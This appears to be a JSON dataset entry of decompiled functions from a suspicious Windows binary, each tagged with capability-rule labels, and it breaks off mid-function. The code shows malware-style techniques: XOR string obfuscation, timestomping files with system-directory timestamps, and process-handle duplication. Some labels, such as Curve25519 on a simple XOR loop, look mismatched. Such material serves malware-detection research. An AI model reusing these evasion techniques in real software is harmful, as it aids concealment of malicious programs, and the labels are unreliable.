{
    "00401120": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401285) overlaps instruction at (ram,0x00401283)\n// \n// WARNING: Removing unreachable block (ram,0x004012b0)\n// WARNING: Removing unreachable block (ram,0x004012cd)\n// WARNING: Removing unreachable block (ram,0x004012d2)\n\nuint32_t fcn.00401120(void)\n\n{\n    uint8_t *puVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    ushort uVar4;\n    char cVar8;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    ushort extraout_CX;\n    uint *extraout_ECX;\n    uint *puVar9;\n    uint *extraout_EDX;\n    uint *puVar10;\n    uint *puVar11;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    uint16_t in_ES;\n    ushort in_SS;\n    bool bVar12;\n    uint8_t uVar13;\n    bool bVar14;\n    uint8_t in_AF;\n    bool bVar15;\n    ulong uVar16;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uint var_1fh;\n    uchar uVar17;\n    uchar uVar18;\n    uchar uVar19;\n    uchar uVar20;\n    uint *puVar21;\n    \n    puVar10 = &stack0xfffffffc;\n    puVar11 = &stack0xfffffffc;\n    uVar5 = fcn.00403460();\n    bVar12 = false;\n    bVar15 = uVar5 == 0;\n    bVar14 = (POPCOUNT(uVar5 & 0xff) & 1U) == 0;\n    if (bVar15) {\n        return 0;\n    }\n    if ((bVar14) || (!bVar14)) {\n        puVar21 = 0x40116a;\n        fcn.00401b70();\n        if (!bVar12 && !bVar15) goto code_r0x0040116c;\n    }\n    else {\n        unaff_ESI = 0x34a96cf4;\n        puVar10 = *0xe817b43a;\n        puVar21 = unaff_EDI & 0xffff0000 | in_ES;\n        uVar13 = uVar5 >> 8;\n        bVar12 = CARRY1(*0x34a96cfc, uVar13);\n        *0x34a96cfc = *0x34a96cfc + uVar13;\n        bVar15 = *0x34a96cfc == 0;\ncode_r0x0040116c:\n        puVar11 = puVar10;\n        if (bVar12 || bVar15) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    iVar6 = fcn.004015d0(0x4244d0);\n    bVar12 = iVar6 == -1;\n    if (!bVar12) {\n        return 0;\n    }\n    uVar4 = fcn.00402250();\n    *0x42492c = 1;\n    if ((bVar12) || (!bVar12)) {\n        iVar6 = fcn.00403610();\n        if (iVar6 != 0) {\n            puVar11 = *puVar11;\n            goto code_r0x004011b3;\n        }\n        *(puVar11 + -8) = 0;\n        *(puVar11 + -0x20) = 0;\n        puVar10 = puVar11 + -0x1f;\n        for (iVar6 = 7; iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar10 = 0;\n            puVar10 = puVar10 + 1;\n        }\n        *puVar10 = 0;\n        *(puVar10 + 2) = 0;\n        *(puVar11 + -0x18) = 0;\n        puVar10 = puVar11 + -0x7f;\n        for (iVar6 = 7; iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar10 = 0;\n            puVar10 = puVar10 + 1;\n        }\n        *puVar10 = 0;\n        *(puVar10 + 2) = 0;\n        *(puVar11 + -0x10) = 0;\n        puVar10 = puVar11 + -0x5f;\n        for (iVar6 = 7; iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar10 = 0;\n            puVar10 = puVar10 + 1;\n        }\n        *puVar10 = 0;\n        *(puVar10 + 2) = 0;\n        uVar4 = 0;\n        puVar10 = puVar11 + -0x18;\n        puVar21 = puVar11 + -0x3f;\n        for (iVar6 = 7; iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar21 = 0;\n            puVar21 = puVar21 + 1;\n        }\n    }\n    else {\n        puVar21 = unaff_EDI + 1;\n        uVar3 = in(extraout_EDX);\n        *unaff_EDI = uVar3;\n        puVar10 = extraout_EDX;\n        if (0 < &stack0xffffff70) {\ncode_r0x004011b3:\n            *(puVar11 + 0xcc21d30) = *(puVar11 + 0xcc21d30);\n            uVar13 = *(puVar21 + 0x5e);\n            *(puVar21 + 0x5e) = uVar13 >> 2 | uVar13 << 7;\n            uVar5 = in(0x5d);\n            return uVar5;\n        }\n    }\n    *puVar21 = uVar4;\n    iVar6 = puVar21 + 3;\n    *(puVar21 + 2) = uVar4;\n    iVar7 = fcn.00403650(puVar11 + -0x20, puVar10, puVar11 + -8, puVar11 + -0x10);\n    bVar12 = iVar7 == 0;\n    if (bVar12) {\n        return 0;\n    }\n    if (!bVar12) {\n        if (bVar12) {\n            iVar6 = CONCAT13(extraout_CX >> 8, CONCAT12(extraout_CX, in_SS));\n            uVar17 = 0x47;\n            uVar18 = 0;\n            uVar19 = 0;\n            uVar20 = 0;\n            goto code_r0x0040125c;\n        }\n    }\n    puVar10 = puVar11 + -8;\n    uVar17 = SUB41(puVar10, 0);\n    uVar18 = puVar10 >> 8;\n    uVar19 = puVar10 >> 0x10;\n    uVar20 = puVar10 >> 0x18;\ncode_r0x0040125c:\n    uVar16 = fcn.004038a0(CONCAT13(uVar20, CONCAT12(uVar19, CONCAT11(uVar18, uVar17))));\n    puVar21 = uVar16 >> 0x20;\n    puVar10 = uVar16;\n    uVar13 = 0;\n    bVar12 = (POPCOUNT(puVar10 & 0xff) & 1U) == 0;\n    if (puVar10 == NULL) {\n        return 0;\n    }\n    if ((bVar12) || (!bVar12)) {\n        puVar10 = puVar11 + -8;\n        puVar9 = puVar11 + -0x18;\n        puVar21 = puVar11 + -0x20;\n    }\n    else {\n        out(*unaff_ESI, uVar16 >> 0x20);\n        uVar13 = in_AF;\n        do {\n            cVar8 = puVar10 >> 8;\n            uVar13 = 9 < (puVar10 & 0xf) | uVar13;\n            puVar10 = CONCAT31(CONCAT21(puVar10 >> 0x10, cVar8 - uVar13), -uVar13);\n            puVar9 = extraout_ECX;\n        } while (uVar13 || cVar8 == *puVar21);\n    }\n    piVar2 = iVar6 + puVar21 * 2;\n    *piVar2 = (*piVar2 + 0x7b) - uVar13;\n    *(puVar9 + -0x73) = puVar10;\n    puVar1 = puVar11 + -0x72ad1fbb;\n    *puVar1 = *puVar1 >> 5 | *puVar1 << 3;\n    iVar6 = fcn.00404230(puVar21, puVar9, puVar11);\n    return iVar6 != 0;\n}\n",
        "token_count": 2017
    },
    "00401340": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401387) overlaps instruction at (ram,0x00401385)\n// \n\nuint __cdecl fcn.00401340(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.004015d0(0x4244d8);\n    if (iVar1 == -1) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x40);\n    if (iVar1 != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(arg_8h, iVar1, 0, 0, 0, 2);\n        iVar3 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar2);\n        if (iVar3 != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 233
    },
    "00401410": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nuint __cdecl fcn.00401410(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    bool bVar2;\n    bool bVar3;\n    int32_t iVar4;\n    uint var_4h;\n    \n    *0x424928 = fcn.00404cd0();\n    arg_8h_00 = (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0x40000000, 1, 0, 2, 0x80, 0);\n    if (arg_8h_00 == -1) {\n        return 0;\n    }\n    iVar4 = arg_8h_00;\n    iVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)(arg_8h_00, arg_ch, arg_10h, &var_4h, 0);\n    bVar2 = iVar1 == 0;\n    if (bVar2) {\n        return 0;\n    }\n    if ((!bVar2) && (bVar2)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    bVar2 = false;\n    bVar3 = *0x424928 == 0;\n    if (!bVar3) {\n        iVar1 = fcn.00401340(arg_8h_00);\n        bVar2 = (iVar1 != 0) != 0;\n        *0x424928 = 1 - (iVar1 != 0);\n        bVar3 = *0x424928 == 0;\n    }\n    if ((!bVar2 && !bVar3) && (bVar2 || bVar3)) {\n        arg_8h_00 = iVar4;\n    }\n    fcn.00403e90(0, arg_8h_00);\n    if (*0x424928 == 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(arg_8h_00);\n    }\n    return 1;\n}\n",
        "token_count": 466
    },
    "004015d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00401692)\n\nuint __cdecl fcn.004015d0(uint arg_8h)\n\n{\n    bool bVar1;\n    code *pcVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    ulong uVar6;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_108h;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    puVar3 = (**0x4248fc)(2, 0);\n    if (puVar3 == 0xffffffff) {\n        return 0xffffffff;\n    }\n    var_12ch = 0x128;\n    puVar5 = &var_128h;\n    for (iVar4 = 0x49; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    uVar6 = (**0x424900)(puVar3, &var_12ch);\n    pcVar2 = _sym.imp.MSVCRT.dll__stricmp;\n    do {\n        bVar1 = uVar6 == 0;\n        if (bVar1) {\ncode_r0x004016a5:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(puVar3);\n            return var_4h;\n        }\n        if ((!bVar1) && (bVar1)) {\n            out(*puVar3, uVar6 >> 0x20);\n            puVar3 = puVar3 + 1;\n        }\n        iVar4 = (*pcVar2)(&var_108h, arg_8h);\n        if (iVar4 == 0) {\n            var_4h = var_124h;\n            goto code_r0x004016a5;\n        }\n        uVar6 = (**0x424904)(puVar3, &var_12ch);\n    } while( true );\n}\n",
        "token_count": 449
    },
    "00403610": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403639) overlaps instruction at (ram,0x00403634)\n// \n\nuint fcn.00403610(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00403870(0x42446c);\n    if (iVar1 == -1) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)();\n    return 1;\n}\n",
        "token_count": 99
    },
    "00403e90": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403f2c) overlaps instruction at (ram,0x00403f2a)\n// \n\nuint __cdecl fcn.00403e90(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    char *pcVar7;\n    uint *puVar8;\n    char lpBuffer;\n    uint var_22bh;\n    uint var_128h;\n    uint var_24h;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    \n    lpBuffer = '\\0';\n    var_128h._0_1_ = 0;\n    puVar5 = &var_22bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    puVar5 = &var_128h + 1;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    uVar3 = 0xffffffff;\n    pcVar6 = &lpBuffer;\n    do {\n        pcVar7 = pcVar6;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar7 = pcVar6 + 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar7;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    puVar5 = pcVar7 + -uVar3;\n    puVar8 = &var_128h;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar8 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar8 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    uVar3 = 0xffffffff;\n    *(arg_ch + -0x3fcc0037) = *(arg_ch + -0x3fcc0037) + -0x41;\n    pcVar6 = str.21e_;\n    do {\n        pcVar7 = pcVar6;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar7 = pcVar6 + 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar7;\n    } while (cVar1 != -0x41);\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    puVar5 = &var_128h;\n    do {\n        puVar8 = puVar5;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        puVar8 = puVar5 + 1;\n        cVar1 = *puVar5;\n        puVar5 = puVar8;\n    } while (cVar1 != -0x41);\n    puVar5 = pcVar7 + -uVar3;\n    puVar8 = puVar8 + -1;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar8 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar8 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(&var_128h, 0, &var_24h);\n    iVar2 = arg_ch;\n    if ((arg_ch == -1) && (iVar2 = fcn.00403870(arg_8h),  iVar2 == -1)) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, *0x10 + -0x24, *0x10 + -0x1c, 0xec);\n    if (arg_ch == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1197
    },
    "00404530": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404584) overlaps instruction at (ram,0x00404582)\n// \n\nvoid __cdecl\nfcn.00404530(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, int32_t arg_20h)\n\n{\n    uint arg_10h_00;\n    int32_t iVar1;\n    int16_t unaff_BX;\n    uint *puVar2;\n    uint16_t unaff_DI;\n    uint *puVar3;\n    bool bVar4;\n    char cVar5;\n    char cVar6;\n    ulong uVar7;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar2 = &stack0xfffffffc;\n    cVar6 = '\\0';\n    cVar5 = ((unaff_DI | 0x2fff) - unaff_BX ^ 0x7174) < 0;\n    uVar7 = fcn.004016c0(arg_18h, arg_1ch, arg_8h, 0x20, arg_20h + 0x20);\n    arg_10h_00 = uVar7 >> 0x20;\n    iVar1 = uVar7;\n    if ((cVar6 != cVar5) || (cVar6 == cVar5)) {\n        iVar1 = arg_20h + 0x60;\n        arg_10h_00 = arg_ch;\n    }\n    fcn.004016c0(arg_18h, arg_1ch, arg_10h_00, 0x20, iVar1);\n    fcn.004016c0(arg_18h, arg_1ch, arg_10h, 0x20, arg_20h + 0xa0);\n    fcn.004016c0(arg_18h, arg_1ch, arg_14h, 0x20, arg_20h + 0xe0);\n    iVar1 = fcn.004044e0();\n    if (iVar1 == -1) {\n        iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(arg_20h + 0x120) = iVar1 % 5;\n    }\n    else {\n        *(arg_20h + 0x120) = iVar1;\n    }\n    var_10ch = 0;\n    puVar3 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    var_4h = 0x104;\n    *(puVar3 + 2) = 0;\n    iVar1 = fcn.00403ff0(0x80000001, 0x4246b4, 0x4246e0, &var_8h, &var_10ch);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_10ch);\n        bVar4 = iVar1 == 0;\n        if (bVar4) {\n            if ((!bVar4) && (bVar4)) {\n                puVar3 = &stack0xfffffebc;\n                cVar5 = '\\x10';\n                do {\n                    puVar2 = puVar2 + -1;\n                    puVar3 = puVar3 + -1;\n                    *puVar3 = *puVar2;\n                    cVar5 = cVar5 + -1;\n                } while ('\\0' < cVar5);\n            }\n            *(arg_20h + 0x120) = *(arg_20h + 0x120) | 0x80;\n        }\n    }\n    return;\n}\n",
        "token_count": 873
    },
    "00404c80": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00404c80(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n    if (iVar1 != -1) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 73
    },
    "00404cd0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool fcn.00404cd0(void)\n\n{\n    int32_t iVar1;\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x104;\n    iVar1 = fcn.00403ff0(0x80000002, 0x42474c, str.5e0, &var_8h, &var_10ch, &var_4h);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(&var_10ch, 0);\n    return iVar1 != -1;\n}\n",
        "token_count": 151
    },
    "004012b0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nuint fcn.004012b0(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    int32_t iVar1;\n    uint filename;\n    uint mode;\n    uint ptr;\n    uint nitems;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_fopen)(filename, mode);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.MSVCRT.dll_fwrite)(ptr, 1, nitems, iVar1);\n    (*_sym.imp.MSVCRT.dll_fflush)(iVar1);\n    (*_sym.imp.MSVCRT.dll_fclose)(iVar1);\n    return 1;\n}\n",
        "token_count": 154
    },
    "004016c0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040173e) overlaps instruction at (ram,0x0040173a)\n// \n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004016c0(int32_t **arg_8h, int32_t *arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t *piVar1;\n    char *pcVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint8_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint8_t uVar9;\n    uint32_t unaff_EBX;\n    bool bVar10;\n    int32_t var_8h;\n    uint var_1h;\n    \n    bVar10 = arg_14h == 0;\n    var_8h = 0;\n    if (0 < arg_14h) {\n        uVar7 = 1;\n        iVar5 = arg_14h;\n        do {\n            uVar8 = uVar7;\n            if (bVar10) {\ncode_r0x004016f1:\n                var_1h._0_1_ = *(var_8h + arg_10h);\n            }\n            else {\n                uVar4 = (uVar7 >> 8 & 0xffff00) << 8;\n                uVar8 = uVar4 | uVar7 & 0xffff;\n                if (!bVar10) goto code_r0x004016f1;\n                *(unaff_EBX + 0x48af855) = *(unaff_EBX + 0x48af855) + uVar7;\n                uVar8 = uVar4 | uVar7 & 0xff00 | uVar7 + *(iVar5 + 0xa7eff45);\n            }\n            uVar7 = uVar8 % arg_ch;\n            do {\n                uVar3 = *(uVar7 + arg_8h);\n                uVar4 = uVar7 & 0xffffff00;\n                uVar7 = uVar4 | uVar3;\n                uVar6 = uVar8;\n                uVar9 = uVar4 >> 8;\n                if ((uVar9 < uVar6) || (uVar9 >= uVar6)) {\n                    unaff_EBX = unaff_EBX & 0xffffff00 | var_1h ^ *((uVar8 - 1) % arg_ch + arg_8h);\n                    break;\n                }\n                uVar8 = uVar8 - 1;\n            } while (uVar8 != 0 && uVar9 == uVar6);\n            iVar5 = *arg_ch;\n            *arg_8h = arg_ch + 1;\n            piVar1 = (iVar5 >> 0x1f) + -0x86600a3;\n            *piVar1 = *piVar1 + -1;\n            pcVar2 = (iVar5 >> 0x1f) + -0x27cdc5fc;\n            *pcVar2 = *pcVar2 + -1;\n            var_1h._0_1_ = unaff_EBX;\n            uVar6 = arg_14h * '\\x02';\n            *(arg_18h + uVar8) = uVar6 ^ var_1h;\n            unaff_EBX = CONCAT31((unaff_EBX & 0xffffff00) >> 8 & 0xffff00 | (unaff_EBX & 0xffffff00) >> 8, uVar3);\n            uVar7 = uVar8 + 3;\n            *(uVar8 + 1 + arg_18h) = uVar6 ^ uVar3;\n            iVar5 = var_8h + 1;\n            bVar10 = iVar5 == arg_14h;\n            var_8h = iVar5;\n        } while (iVar5 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 897
    },
    "004017d0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.004017d0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_1h;\n    \n    iVar1 = 0;\n    if (0 < arg_14h) {\n        do {\n            *(iVar1 + arg_10h) = arg_14h ^ *(iVar1 + arg_10h) ^ *(iVar1 % arg_ch + arg_8h);\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 160
    },
    "00401c40": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401efa) overlaps instruction at (ram,0x00401ef6)\n// \n// WARNING: Removing unreachable block (ram,0x00401fc6)\n// WARNING: Type propagation algorithm not settling\n\nvoid fcn.00401c40(void)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    uint8_t uVar3;\n    ushort uVar4;\n    uint16_t uVar5;\n    uint32_t uVar6;\n    uint32_t *puVar7;\n    uint8_t *puVar8;\n    uint8_t **ppuVar9;\n    int32_t iVar10;\n    char extraout_CL;\n    uint8_t extraout_CL_00;\n    int16_t extraout_CX;\n    int32_t extraout_ECX;\n    uint extraout_ECX_00;\n    uint8_t extraout_CH;\n    uint8_t extraout_CH_00;\n    uint8_t extraout_CH_01;\n    char extraout_CH_02;\n    int32_t extraout_ECX_01;\n    uint8_t extraout_DL;\n    uint8_t extraout_DL_00;\n    ushort extraout_DX;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t extraout_EDX_01;\n    char *pcVar11;\n    uint16_t unaff_BX;\n    uint32_t unaff_EBP;\n    int32_t arg_10h;\n    uint *unaff_ESI;\n    uint *puVar12;\n    uint8_t **ppuVar13;\n    uint16_t in_ES;\n    uint16_t in_SS;\n    uint16_t uVar14;\n    uchar uVar15;\n    bool bVar16;\n    uint8_t in_AF;\n    bool bVar17;\n    char cVar18;\n    char cVar19;\n    bool bVar20;\n    ushort in_FPUControlWord;\n    ushort in_FPUStatusWord;\n    ushort in_FPUTagWord;\n    ushort in_FPULastInstructionOpcode;\n    uint in_FPUDataPointer;\n    uint in_FPUInstructionPointer;\n    ulong uVar21;\n    uint in_stack_ffffffb8;\n    int32_t arg_14h;\n    uint uVar22;\n    uint arg_ch;\n    uint32_t uVar23;\n    uint uVar24;\n    uint uVar25;\n    uint arg_14h_00;\n    \n    uVar23 = unaff_EBP;\n    uVar6 = fcn.004017d0(0x424454, 0x18, str.M_2._OF, 10);\n    ppuVar9 = uVar23 & 0xffff0000 | in_SS;\n    bVar17 = (uVar6 & 0x126a18c5) == 0;\n    uVar14 = in_SS;\n    fcn.004017d0(0x424454, 0x18, str.U1w0, 0x47);\n    puVar12 = unaff_ESI;\n    if ((!bVar17) && (bVar17)) {\n        puVar12 = unaff_ESI + 1;\n        out(*unaff_ESI, extraout_DX);\n    }\n    uVar22 = 0x4244a0;\n    fcn.004017d0(0x424454, 0x18, 0x4244a0, 4);\n    fcn.004017d0(0x424454, 0x18, str.21e_, 0xc);\n    while( true ) {\n        bVar17 = false;\n        uVar24 = 0x401cfb;\n        fcn.004017d0(0x424454, 0x18, 0x4244b0, 7);\n        if ((bVar17) || (!bVar17)) {\n            uVar24 = 0xb;\n        }\n        uVar4 = fcn.004017d0(0x424454, 0x18, str.e_ex:, uVar24);\n        uVar5 = CONCAT11((uVar4 >> 8) - extraout_CL, uVar4 + '\\x01') - 1;\n        cVar19 = '\\0';\n        cVar18 = '\\0';\n        bVar17 = (uVar5 & 0x637b) == 0;\n        uVar15 = (POPCOUNT(uVar5 & 0x7b) & 1U) == 0;\n        uVar3 = fcn.004017d0(0x424454, 0x18, 0x424454, 0xc);\n        if ((bVar17 || cVar19 != cVar18) || (!bVar17 && cVar19 == cVar18)) break;\n        in_AF = 9 < (uVar3 & 0xf) | in_AF;\n        if (extraout_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    fcn.004017d0(0x424454, 0x18, 0x4244d0, 8);\n    if ((uVar15) || (!uVar15)) {\n        uVar24 = 0xd;\n        uVar22 = 0x4244d8;\n    }\n    else {\n        *(extraout_EDX + 0xd) = *(extraout_EDX + 0xd) + -0x68;\n        uVar24 = extraout_ECX_00;\n    }\n    fcn.004017d0(0x424454, 0x18, uVar22, uVar24);\n    fcn.004017d0(0x424454, 0x18, 0x4244e8, 0x18);\n    fcn.004017d0(0x424454, 0x18, 0x424500, 0x25);\n    fcn.004017d0(0x424454, 0x18, 0x424528, 10);\n    fcn.004017d0(0x424454, 0x18, 0x424534, 0xc);\n    fcn.004017d0(0x424454, 0x18, 0x424540, 0xd);\n    uVar24 = 0x424550;\n    uVar22 = 0x18;\n    fcn.004017d0(0x424454, 0x18, 0x424550, 6);\n    fcn.004017d0(0x424454, 0x18, 0x424558, 5);\n    fcn.004017d0(0x424454, 0x18, 0x424560, 0xd);\n    bVar17 = (extraout_CX - 1U & in_SS | 0x61be) < 0;\n    uVar25 = 0x401f00;\n    fcn.004017d0(0x424454, 0x18, 0x424570, 0x19);\n    if ((bVar17) || (!bVar17)) {\n        uVar25 = 0xf;\n        uVar24 = 0x42458c;\n        uVar22 = 0x18;\n    }\n    *(unaff_EBP + 0x42) = in_ES;\n    puVar8 = extraout_EDX_00 + 0x18;\n    bVar17 = CARRY1(*puVar8, extraout_CH);\n    *puVar8 = *puVar8 + extraout_CH;\n    puVar7 = fcn.004017d0(0x424454, uVar22, uVar24, uVar25);\n    if ((!bVar17) && (bVar17)) {\n        if (*puVar7 <= &stack0xffffffd0 && puVar7 != 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    uVar22 = 0x401f60;\n    fcn.004017d0(0x424454, 0x18, 0x42459c, 0xe);\n    fcn.004017d0(0x424454, 0x18, 0x4245ac, 0xb);\n    uVar3 = unaff_BX >> 8;\n    uVar15 = 0;\n    cVar19 = '\\0';\n    cVar18 = (extraout_DL ^ uVar3 | 0x67) < '\\0';\n    puVar8 = fcn.004017d0(0x424454, 0x18, 0x4245b8, 0xb);\n    ppuVar13 = ppuVar9;\n    if ((cVar19 == cVar18) && (cVar19 != cVar18)) {\n        out(0xc4, puVar8);\n        ppuVar13 = ppuVar9 + 1;\n        *ppuVar9 = puVar8;\n        uVar15 = uVar3 < *puVar8;\n    }\n    uVar24 = 0x4245c4;\n    uVar21 = fcn.004017d0(0x424454, 0x18, 0x4245c4, 0xb);\n    iVar10 = uVar21 >> 0x20;\n    if ((uVar15) || (arg_14h = iVar10,  !uVar15)) {\n        arg_14h = 10;\n        uVar22 = 0x4245d0;\n        in_stack_ffffffb8 = 0x18;\n    }\n    *(puVar12 + 